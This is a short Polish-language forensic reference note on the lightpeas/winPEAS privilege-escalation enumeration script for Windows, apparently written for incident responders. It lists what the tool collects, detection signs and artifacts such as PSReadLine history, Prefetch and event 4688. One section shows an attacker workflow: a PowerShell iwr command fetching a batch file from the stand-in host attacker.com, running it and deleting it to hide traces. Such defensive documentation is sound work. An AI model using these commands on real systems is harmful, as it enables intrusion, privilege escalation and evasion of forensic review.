---
tags:
  - windows
  - privilege-escalation
  - enumeration
  - attack
  - winpeas
category: windows
platform: windows
---

# lightpeas / winPEAS

Skrypt do automatycznej enumeracji podatności i błędnych konfiguracji na systemie Windows w celu eskalacji uprawnień (Privilege Escalation). lightpeas to wariant popularnego **winPEAS** z projektu PEASS-ng.

---

## Co zbiera

- Informacje o systemie i wersji OS
- Konta użytkowników i grupy
- Uruchomione procesy i usługi
- Zaplanowane zadania (Scheduled Tasks)
- Uprawnienia do plików i folderów
- Podatne konfiguracje (AlwaysInstallElevated, słabe ACL, unquoted service paths)
- Przechowywane credentiale
- Sieć i połączenia

---

## Jak używany przez atakujących

Typowy workflow po uzyskaniu dostępu do systemu:

```powershell
# Pobranie przez PowerShell
iwr http://attacker.com/lightpeas.bat -o C:\Users\Public\lp.bat

# Uruchomienie
.\lp.bat

# Usunięcie śladów
del .\lp.bat
```

---

## Detekcja

- Charakterystyczna nazwa pliku w logach i artefaktach
- Pobieranie skryptu `.bat` / `.ps1` z zewnętrznego URL przez `iwr` — ślad w [[psreadline]]
- Wzmożona aktywność enumeracyjna — dużo zapytań o ACL, usługi, scheduled tasks w krótkim czasie
- Ślad uruchomienia w [[prefetch]]

---

## Gdzie szukać śladów w artefaktach

| Artefakt | Co znajdziesz |
|----------|--------------|
| [[psreadline]] | Komenda `iwr` z URL pobrania |
| [[prefetch]] | Ślad uruchomienia pliku .bat |
| Event Logs (4688) | Tworzenie procesu |
